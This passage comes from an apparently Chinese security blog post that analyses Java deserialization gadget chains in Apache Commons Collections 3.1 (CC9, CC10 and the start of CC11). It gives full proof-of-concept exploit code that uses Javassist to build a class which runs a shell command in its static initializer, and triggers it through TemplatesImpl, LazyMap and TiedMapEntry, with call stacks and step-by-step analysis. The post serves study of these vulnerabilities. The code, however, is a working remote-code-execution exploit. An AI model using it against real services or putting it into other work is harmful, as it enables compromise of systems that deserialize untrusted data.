<span class="keyword">class</span> <span class="title class_">CC9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, tiedMapEntry);</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC9&quot;</span>));</span><br><span class="line">            outputStream.writeObject(exception);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC9&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-9">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, EvilCat88341941093958</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:<span class="number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">57</span>, CC9</span><br></pre></td></tr></table></figure>
<h2 id="分析-8">分析</h2>
<p>把<strong>TreeBag</strong>换成了<strong>BadAttributeValueExpException+LazyMap</strong>来触发，也没啥好说的，简单过一遍。</p>
<p><strong>BadAttributeValueExpException#readObject</strong>调用了<strong>valObj.toString()</strong>，此时<strong>valObj</strong>为<strong>TiedMapEntry</strong>，因此跳到<strong>TiedMapEntry#toString</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后<strong>TiedMapEntry#toString</strong>转<strong>TiedMapEntry#getValue</strong>，此时<strong>map</strong>为<strong>LazyMap</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此触发<strong>LazyMap#get</strong>，而这时<strong>factory</strong>为<strong>InvokerTransformer</strong>，<strong>key</strong>为<strong>TemplatesImpl</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>InvokerTransformer#transform</strong>反射调用，执行<strong>TemplatesImpl#newTransformer</strong>，反射执行恶意字节码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections10">CommonsCollections10</h1>
<h2 id="影响版本-9">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-10">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateFactory</span> <span class="variable">instantiateFactory</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateFactory</span>(</span><br><span class="line">                        TrAXFilter.class, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;);</span><br><span class="line">        <span class="type">FactoryTransformer</span> <span class="variable">factoryTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FactoryTransformer</span>(instantiateFactory);</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, constantTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, factoryTransformer);</span><br><span class="line">        lazyMap.remove(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC10&quot;</span>));</span><br><span class="line">            outputStream.writeObject(expMap);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC10&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-10">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, EvilCat248160042878084</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">create:<span class="number">128</span>, InstantiateFactory (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">72</span>, FactoryTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">120</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1397</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">62</span>, CC10</span><br></pre></td></tr></table></figure>
<h2 id="分析-9">分析</h2>
<p><strong>HashMap#readObject</strong>触发<strong>TiedMapEntry#hashCode</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> </span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TiedMapEntry#hashCode</strong>触发<strong>TiedMapEntry#getValue</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后轻车熟路，<strong>TiedMapEntry#getValue</strong>到<strong>LazyMap#get</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>LazyMap#get</strong>到<strong>FactoryTransformer#transform</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iFactory.create();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>FactoryTransformer#transform</strong>到<strong>InstantiateFactory#create</strong>，<strong>iConstructor</strong>为<strong>TrAXFilter</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstructor.newInstance(iArgs);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>故<strong>InstantiateFactory#create</strong>触发<strong>TrAXFilter</strong>的构造方法，<strong>templates</strong>为恶意字节码，执行<strong>newTransformer</strong>触发。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而最后需要<strong>remove</strong>操作，是<strong>LazyMap#get</strong>中<strong>map.containsKey(key)
== false</strong>成立。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections11">CommonsCollections11</h1>
<p><strong>CC2+CC6</strong>。</p>
<h2 id="影响版本-10">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-11">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span 